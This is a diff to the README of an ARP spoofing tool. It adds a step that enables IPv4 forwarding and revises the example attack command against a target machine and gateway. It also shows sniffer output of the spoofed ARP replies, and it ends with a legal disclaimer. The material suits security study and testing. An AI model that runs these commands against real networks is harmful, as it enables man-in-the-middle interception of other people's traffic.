@@ -48,26 +48,34 @@ optional arguments:
 ```
 
 
-## Sample Output
+## Running the Application
 
-- Example command to initiate an attack against a given target machine and gateway:
-```
-user@host:~$ sudo python3 arpspoof.py eth0 --attackermac 08:00:27:1f:6a:67 \
---gatemac 52:54:00:45:6a:69 --targetmac 08:00:27:83:dc:02 \
---gateip 10.0.1.1 --targetip 10.0.1.6
+- Execute the following command with administrative privileges in order to enable 
+forwarding of IPv4 packets through the attacker machine. This is a temporary solution 
+meant to be reset upon the next reboot (for a permanent solution check [this guide](https://linuxhint.com/enable_ip_forwarding_ipv4_debian_linux/)):
 
-[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
-```
-- Example traffic displayed by [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer)
-as the attack takes place:
-```
-[>] Packet #1 at 15:15:03:
-    [+] MAC ......08:00:27:1f:6a:67 -> 52:54:00:45:6a:69
-    [+] ARP ...............10.0.1.6 -> Is at 08:00:27:1f:6a:67
-[>] Packet #2 at 15:15:03:
-    [+] MAC ......08:00:27:1f:6a:67 -> 08:00:27:83:dc:02
-    [+] ARP ...............10.0.1.1 -> Is at 08:00:27:1f:6a:67
-```
+  `user@host:~$ sudo sysctl -w net.ipv4.ip_forward=1`
+
+- Example command with which we initiate an attack against a given target machine 
+and gateway (the `eth0` interface is the one the attacker uses to send spoofed 
+packets):
+  ```
+  user@host:~$ sudo python3 arpspoof.py eth0 \
+  --gateip 10.0.1.1 --gatemac 52:54:00:45:6a:69 \
+  --targetip 10.0.1.6 --targetmac 08:00:27:83:dc:02
+  
+  [+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
+  ```
+- Traffic displayed by [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer)
+as the attack initiated above takes place:
+  ```
+  [>] Packet #1 at 15:15:03:
+      [+] MAC ......08:00:27:1f:6a:67 -> 52:54:00:45:6a:69
+      [+] ARP ...............10.0.1.6 -> Is at 08:00:27:1f:6a:67
+  [>] Packet #2 at 15:15:03:
+      [+] MAC ......08:00:27:1f:6a:67 -> 08:00:27:83:dc:02
+      [+] ARP ...............10.0.1.1 -> Is at 08:00:27:1f:6a:67
+  ```
 
 ## Legal Disclaimer
 The use of code contained in this repository, either in part or in its totality, 
